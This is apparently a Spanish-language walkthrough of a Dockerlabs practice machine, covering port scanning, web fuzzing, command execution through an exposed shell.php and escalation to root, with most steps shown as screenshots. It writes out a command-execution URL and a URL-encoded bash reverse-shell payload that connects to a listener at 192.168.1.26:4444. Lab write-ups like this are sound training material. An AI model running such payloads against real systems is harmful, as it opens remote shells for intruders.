Maquina de Dockerlabs, de la seccion Facil.

Descargo y descomprimo la maquina. La lanzo:

![IMG-20260111232608934](../Imagenes/whereismywebshell/IMG-20260111232608934.png)

En primer lugar voy a hacer un <font color="#c00000">Nmap completo</font>, pra ver puertos abiertos y servicios:

![IMG-20260111232850661](../Imagenes/whereismywebshell/IMG-20260111232850661.png)
![IMG-20260111232858830](../Imagenes/whereismywebshell/IMG-20260111232858830.png)

Bien veo el <font color="#c00000">Puerto 80 abierto</font> en lo que parece ser una pagina web de una Academia de Ingles, entro por el navegador y en la parte de abajo de la maquina encuentro esto:

![IMG-20260111233051759](../Imagenes/whereismywebshell/IMG-20260111233051759.png)

Voy a hacer <font color="#c00000">fuzzing web</font> a ver que encuentro:

![IMG-20260111233248109](../Imagenes/whereismywebshell/IMG-20260111233248109.png)
![IMG-20260111233252653](../Imagenes/whereismywebshell/IMG-20260111233252653.png)

Tanto el archivo shell.php, como warning.html parecen interesantes, compruebo warning.html:

![IMG-20260111233443297](../Imagenes/whereismywebshell/IMG-20260111233443297.png)

Informacion en <font color="#c00000">warning.html</font>, nada mas

Probaremos con <font color="#c00000">wfuzz</font> sobre shell.php:

![IMG-20260111234636685](../Imagenes/whereismywebshell/IMG-20260111234636685.png)

Con esto podemos tener <font color="#c00000">ejecucion remota de comandos</font>:
http://172.17.0.2/shell.php?parameter=id

Lo probamos:

![IMG-20260111235810292](../Imagenes/whereismywebshell/IMG-20260111235810292.png)

Bien voy a <font color="#c00000">cargar un payload</font>, que pueda usar con una url y con un listener, voy a intentar conectarme:
http://172.17.0.2/shell.php?parameter=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.26%2F4444%200%3E%261%27

![IMG-20260112000348822](../Imagenes/whereismywebshell/IMG-20260112000348822.png)

Estoy dentro, ahora hay que estabilizar <font color="#c00000">la sesion</font>:

![IMG-20260112001122103](../Imagenes/whereismywebshell/IMG-20260112001122103.png)
![IMG-20260112001132815](../Imagenes/whereismywebshell/IMG-20260112001132815.png)

#### Escalada de Privilegios
Tenemos ya una sesion mas estable. Miraremos ahora en el archivo, que nos decian en la web:

![IMG-20260112001237753](../Imagenes/whereismywebshell/IMG-20260112001237753.png)

Lo abrimos:
![IMG-20260112001317753](../Imagenes/whereismywebshell/IMG-20260112001317753.png)

Lo metemos:
![IMG-20260112001402390](../Imagenes/whereismywebshell/IMG-20260112001402390.png)

<font color="#c00000">Somos root!!!!</font>
